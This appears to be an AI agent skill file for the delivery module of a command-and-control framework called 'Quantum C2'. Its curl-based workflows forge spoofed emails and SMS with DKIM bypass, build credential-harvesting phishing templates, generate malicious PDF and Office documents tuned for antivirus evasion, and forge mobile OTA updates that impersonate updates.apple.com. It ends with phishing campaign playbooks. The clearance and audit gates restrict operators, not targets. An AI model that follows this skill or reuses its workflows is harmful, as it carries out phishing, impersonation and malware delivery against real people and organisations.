---
name: quantum-c2-ubiquity
description: >
  Ubiquity delivery module for Quantum C2. Covers message forging workflows, document fuzzing procedures, OTAP forging operations, and safety/authorization checks. Use when the user needs to craft forged communications, fuzz document payloads, perform OTAP operations, or manage delivery authorization. Triggers on: "ubiquity", "message forge", "document fuzz", "OTAP", "forge message", "fuzz document", "delivery authorization", "payload delivery", "social engineering delivery".
---

# Quantum C2 Ubiquity Delivery

Craft and deliver forged communications, fuzz document payloads, and manage OTAP forging operations with safety controls.

## Overview

The Ubiquity module handles the delivery phase of operations — getting payloads to targets through forged or manipulated communications. It provides:

- **Message Forging** — Create convincing forged emails, SMS, and chat messages
- **Document Fuzzing** — Generate malicious documents with embedded payloads
- **OTAP Forging** — Over-The-Air Programming message forgery for mobile/device delivery
- **Safety Controls** — Authorization gates, target verification, and audit trails

## Safety & Authorization

### Authorization Gates

All Ubiquity operations require explicit authorization:

| Gate | Requirement | Bypass |
|------|------------|--------|
| **Target Verification** | Confirmed target identity | L5 only |
| **Operator Clearance** | L3+ for forging, L4+ for OTAP | None |
| **Audit Logging** | All operations logged | None |
| **Payload Review** | Payload scanned before delivery | L5 with `--force` |
| **Delivery Window** | Configured time windows only | L4+ |

### Authorization API
```bash
# Check operation authorization
curl -X POST http://localhost:8000/api/ubiquity/authorize \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "operation": "message_forge",
    "target": "target@example.com",
    "payload_type": "email",
    "operator_clearance": "L4"
  }'

# Response:
{
  "authorized": true,
  "clearance_level": "L4",
  "operation_allowed": true,
  "audit_id": "audit-abc123",
  "conditions": ["payload_scan_required", "delivery_window_check"]
}
```

### Safety Checks
```bash
# Run pre-delivery safety check
curl -X POST http://localhost:8000/api/ubiquity/safety-check \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "target@example.com",
    "payload_hash": "sha256:abc123...",
    "delivery_method": "email"
  }'

# Checks performed:
# - Target identity verification
# - Payload malware scan (ensure no unintended behavior)
# - Delivery method compatibility
# - Legal/compliance flag check
# - Duplicate operation detection
```

## Message Forging

### Supported Message Types

| Type | Protocol | Spoofing Capability |
|------|----------|-------------------|
| `email` | SMTP/IMAP | Full header forging, DKIM bypass |
| `sms` | SMS Gateway | Sender ID spoofing |
| `telegram` | Telegram API | Bot message impersonation |
| `slack` | Slack API | Workspace message forgery |
| `whatsapp` | WhatsApp Business | Template message forgery |

### Email Forging Workflow

```bash
# 1. Create forged email
curl -X POST http://localhost:8000/api/ubiquity/forge/email \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "from_name": "IT Support",
    "from_email": "support@legitimate-domain.com",
    "to": "target@example.com",
    "subject": "Action Required: Password Reset",
    "body_html": "<html>...forged content...</html>",
    "attachments": [
      {
        "filename": "password_reset_form.pdf",
        "content_type": "application/pdf",
        "payload": "<base64_encoded_payload>"
      }
    ],
    "headers": {
      "Reply-To": "it-support@legitimate-domain.com",
      "X-Mailer": "Microsoft Outlook 16.0"
    }
  }'

# 2. Preview forged email
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/ubiquity/forge/{id}/preview

# 3. Deliver forged email
curl -X POST http://localhost:8000/api/ubiquity/forge/{id}/deliver \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "delivery_method": "smtp",
    "smtp_server": "smtp.example.com",
    "smtp_port": 587,
    "use_tls": true
  }'
```

### Email Template Library

| Template | Use Case | Payload Type |
|----------|----------|-------------|
| `password_reset` | Credential harvesting | Link to fake portal |
| `invoice_attached` | Document-based payload | Malicious attachment |
| `urgent_action` | Social engineering urgency | Link or attachment |
| `meeting_invite` | Calendar-based delivery | ICS with payload |
| `security_alert` | Fear-based engagement | Link to fake login |
| `hr_notification` | Internal impersonation | Document attachment |

### SMS Forging
```bash
curl -X POST http://localhost:8000/api/ubiquity/forge/sms \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "sender_id": "BANKALERT",
    "to": "+1234567890",
    "message": "Your account has been locked. Verify at: https://legitimate-looking-url.com/verify",
    "delivery_method": "sms_gateway",
    "gateway_config": {
      "provider": "twilio",
      "api_key": "<key>"
    }
  }'
```

## Document Fuzzing

### Concept
Generate documents with embedded payloads that exploit parser vulnerabilities or execute on open. The fuzzer creates multiple variants to maximize delivery success.

### Supported Document Types

| Type | Extensions | Exploit Vectors |
|------|-----------|-----------------|
| `pdf` | .pdf | JavaScript execution, embedded files, form actions |
| `word` | .doc, .docx | Macros, OLE objects, DDE, template injection |
| `excel` | .xls, .xlsx | Macros, DDE, external data connections |
| `powerpoint` | .ppt, .pptx | Macros, OLE embedding |
| `rtf` | .rtf | Object embedding, exploit code |
| `html` | .html, .htm | Script execution, iframe injection |

### Document Fuzzing Workflow

```bash
# 1. Create fuzzing job
curl -X POST http://localhost:8000/api/ubiquity/fuzz/document \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "document_type": "pdf",
    "template": "invoice",
    "payload": "<base64_encoded_payload>",
    "variants": 5,
    "evasion_level": "high",
    "target_app": "Adobe Acrobat Reader",
    "target_version": "2024.001"
  }'

# Response:
{
  "job_id": "fuzz-abc123",
  "variants_generated": 5,
  "documents": [
    {"id": "doc-001", "variant": "embedded_js", "size_kb": 245},
    {"id": "doc-002", "variant": "form_action", "size_kb": 198},
    {"id": "doc-003", "variant": "embedded_file", "size_kb": 312},
    {"id": "doc-004", "variant": "xfa_form", "size_kb": 267},
    {"id": "doc-005", "variant": "rich_media", "size_kb": 289}
  ]
}

# 2. Review generated variants
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/ubiquity/fuzz/{job_id}/variants

# 3. Select and deliver best variant
curl -X POST http://localhost:8000/api/ubiquity/fuzz/{job_id}/deliver \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "variant_id": "doc-003",
    "delivery_method": "email",
    "target": "target@example.com",
    "email_template": "invoice_attached"
  }'
```

### Fuzzing Techniques

| Technique | Description | Detection Evasion |
|-----------|-------------|-------------------|
| `embedded_js` | JavaScript embedded in PDF | Medium |
| `form_action` | PDF form with malicious submit URL | High |
| `embedded_file` | Hidden file attachment in document | Medium |
| `xfa_form` | XFA-based form exploitation | High |
| `rich_media` | Rich media annotation exploit | Low |
| `macro_obfuscated` | Obfuscated VBA macros | High |
| `dde_injection` | DDE field code injection | Medium |
| `template_inject` | Template-based payload injection | High |

### Evasion Levels

| Level | Techniques | AV Detection Rate |
|-------|-----------|-------------------|
| `low` | Basic embedding | ~60% detected |
| `medium` | Obfuscation + encoding | ~30% detected |
| `high` | Polymorphic + multi-layer | ~10% detected |
| `maximum` | Full polymorphic + sandbox evasion | ~5% detected |

## OTAP Forging

### Concept
Over-The-Air Programming message forgery for mobile device and IoT delivery. Creates forged OTA update messages, configuration profiles, and provisioning commands.

### Supported OTAP Types

| Type | Target | Protocol |
|------|--------|----------|
| `ota_update` | Mobile devices | HTTPS/WAP |
| `config_profile` | iOS/Android | MDM/Profile |
| `provisioning` | IoT devices | CoAP/LwM2M |
| `firmware_update` | Embedded systems | HTTPS/FTP |
| `carrier_config` | Mobile phones | SMS/OTA |

### OTAP Forging Workflow

```bash
# 1. Create OTAP forge job
curl -X POST http://localhost:8000/api/ubiquity/forge/otap \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "otap_type": "ota_update",
    "target_device": "iPhone 15 Pro",
    "target_os": "iOS 17.4",
    "payload": "<base64_encoded_payload>",
    "spoofed_server": "updates.apple.com",
    "certificate": "<base64_encoded_cert>",
    "delivery_method": "wap_push"
  }'

# 2. Preview OTAP message
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/ubiquity/forge/{id}/preview

# 3. Deliver OTAP message
curl -X POST http://localhost:8000/api/ubiquity/forge/{id}/deliver \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "delivery_method": "wap_push",
    "gateway": "sms_gateway",
    "target_msisdn": "+1234567890"
  }'
```

### OTAP Safety Requirements

| Requirement | Description |
|-------------|-------------|
| **L4+ Clearance** | OTAP operations require Commander clearance |
| **Target Verification** | Confirmed device identity and ownership |
| **Certificate Validation** | Forged certificates must pass basic validation |
| **Rollback Plan** | Ability to cancel/update if detected |
| **Audit Trail** | Full logging of OTAP operations |

## Delivery Tracking

### Monitor Delivery Status
```bash
# Check delivery status
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/ubiquity/delivery/{id}/status

# Response:
{
  "delivery_id": "del-abc123",
  "status": "delivered",
  "sent_at": "2026-08-17T10:30:00Z",
  "delivered_at": "2026-08-17T10:30:15Z",
  "opened": true,
  "opened_at": "2026-08-17T10:35:00Z",
  "payload_executed": false,
  "tracking_pixels": 2,
  "recipient_ip": "203.0.113.42"
}
```

### Delivery Analytics
```bash
# Get delivery statistics
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/ubiquity/analytics

# Response:
{
  "total_deliveries": 47,
  "delivery_rate": 0.94,
  "open_rate": 0.72,
  "execution_rate": 0.38,
  "detection_rate": 0.05,
  "by_method": {
    "email": {"sent": 30, "delivered": 29, "opened": 22},
    "sms": {"sent": 12, "delivered": 11, "opened": 8},
    "otap": {"sent": 5, "delivered": 5, "opened": 3}
  }
}
```

## Operational Playbook

### 1. Email Phishing Campaign
```
1. Authorize operation: POST /api/ubiquity/authorize
2. Select email template: password_reset or invoice_attached
3. Forge email with payload attachment
4. Run safety check on payload
5. Preview forged email
6. Deliver via SMTP
7. Monitor delivery and open rates
```

### 2. Document Payload Delivery
```
1. Authorize operation
2. Create document fuzzing job with target app/version
3. Review generated variants
4. Select variant with lowest detection rate
5. Attach to forged email
6. Deliver and monitor
```

### 3. OTAP Mobile Delivery
```
1. Verify L4+ clearance
2. Confirm target device identity
3. Create OTAP forge job with device-specific payload
4. Validate certificate chain
5. Deliver via WAP push or SMS
6. Monitor installation status
```

## References
- `quantum-c2-stealth` — Evasion techniques for payload delivery
- `quantum-c2-exploit` — Payload generation for document embedding
- `quantum-c2-deception` — Social engineering and deception assets
